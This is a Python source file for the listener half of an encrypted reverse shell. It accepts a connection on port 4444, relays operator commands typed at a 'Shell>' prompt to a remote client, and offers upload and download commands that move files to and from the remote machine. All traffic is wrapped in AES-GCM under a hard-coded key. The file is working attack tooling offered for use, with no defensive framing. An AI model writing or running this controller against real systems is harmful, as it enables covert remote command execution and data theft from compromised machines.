import socket
import base64
from Cryptodome.Cipher import AES
import os

# --- Configuration ---
HOST = '0.0.0.0'  # Listen on all available interfaces
PORT = 4444
# IMPORTANT: This key MUST match the key in the client.py script
AES_KEY = b'DeusExSophia#137' # 16-byte key

# --- AES Encryption/Decryption Functions ---
# These functions must be identical in both listener and client scripts.

def aes_encrypt(data, key):
    """Encrypts data using AES-GCM."""
    cipher = AES.new(key, AES.MODE_GCM)
    ciphertext, tag = cipher.encrypt_and_digest(data)
    # Return nonce, tag, and ciphertext as a single base64 encoded string
    # to ensure all components are sent in one go.
    encrypted_payload = base64.b64encode(cipher.nonce + tag + ciphertext)
    return encrypted_payload

def aes_decrypt(encrypted_payload, key):
    """Decrypts data using AES-GCM."""
    try:
        # Decode from base64 and extract components
        encrypted_data = base64.b64decode(encrypted_payload)
        nonce = encrypted_data[:16]
        tag = encrypted_data[16:32]
        ciphertext = encrypted_data[32:]
        
        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
        plaintext = cipher.decrypt_and_verify(ciphertext, tag)
        return plaintext
    except (ValueError, KeyError) as e:
        print(f"Decryption failed: {e}. The key may be incorrect or the data corrupted.")
        return None

# --- Main Listener Logic ---

def handle_client(conn, addr):
    print(f"[+] Connection established from {addr[0]}:{addr[1]}")

    while True:
        try:
            cmd = input("Shell> ")
            if not cmd:
                continue

            if cmd.strip() == 'exit':
                encrypted_cmd = aes_encrypt(cmd.encode(), AES_KEY)
                conn.send(encrypted_cmd)
                print("[-] Closing connection.")
                break

            # --- Upload Functionality ---
            if cmd.startswith("upload"):
                parts = cmd.split(" ", 2)
                if len(parts) == 3:
                    _, local_path, remote_path = parts
                    if os.path.exists(local_path):
                        # 1. Send the upload command first
                        encrypted_cmd = aes_encrypt(cmd.encode(), AES_KEY)
                        conn.send(encrypted_cmd)

                        # 2. Wait for confirmation before sending file data
                        confirmation = conn.recv(1024) # Expecting 'OK'
                        decrypted_conf = aes_decrypt(confirmation, AES_KEY)

                        if decrypted_conf == b"OK":
                            # 3. Read and send the file data
                            with open(local_path, 'rb') as f:
                                file_data = f.read()
                            encrypted_file = aes_encrypt(file_data, AES_KEY)
                            conn.send(encrypted_file)
                            print(f"[+] Uploading {local_path} to {remote_path}...")

                            # 4. Receive final response from client
                            response_encrypted = conn.recv(8192)
                            response_decrypted = aes_decrypt(response_encrypted, AES_KEY)
                            print(response_decrypted.decode(errors='ignore'))
                        else:
                            print("[-] Client did not confirm upload readiness.")
                    else:
                        print(f"[-] Error: Local file '{local_path}' not found.")
                else:
                    print("[-] Upload usage: upload <local_file_path> <remote_file_path>")
                continue

            # --- Download Functionality ---
            elif cmd.startswith("download"):
                # 1. Send the download command
                encrypted_cmd = aes_encrypt(cmd.encode(), AES_KEY)
                conn.send(encrypted_cmd)
                print(f"[+] Requesting download for: {cmd.split(' ')[1]}")
                
                # 2. Receive the file data (or an error message)
                file_data_encrypted = conn.recv(40960) # Increased buffer for file data
                file_data_decrypted = aes_decrypt(file_data_encrypted, AES_KEY)

                # Check if it's an error message from the client
                if file_data_decrypted.startswith(b"ERROR:"):
                     print(f"[-] Client error: {file_data_decrypted.decode()}")
                else:
                    filename = os.path.basename(cmd.split(" ")[1])
                    with open(filename, 'wb') as f:
                        f.write(file_data_decrypted)
                    print(f"[+] File '{filename}' downloaded successfully.")
                continue

            # --- Standard Command Execution ---
            encrypted_cmd = aes_encrypt(cmd.encode(), AES_KEY)
            conn.send(encrypted_cmd)

            response_encrypted = conn.recv(8192)
            if not response_encrypted:
                print("[-] Connection lost.")
                break
            
            response_decrypted = aes_decrypt(response_encrypted, AES_KEY)
            if response_decrypted:
                print(response_decrypted.decode(errors='ignore'))

        except (ConnectionResetError, BrokenPipeError):
            print("[-] Connection lost.")
            break
        except Exception as e:
            print(f"An error occurred: {e}")
            break
            
    conn.close()

def start_server():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((HOST, PORT))
    s.listen(1)
    print(f"[*] Listening on {HOST}:{PORT}...")
    
    conn, addr = s.accept()
    handle_client(conn, addr)
    s.close()

if __name__ == "__main__":
    start_server()
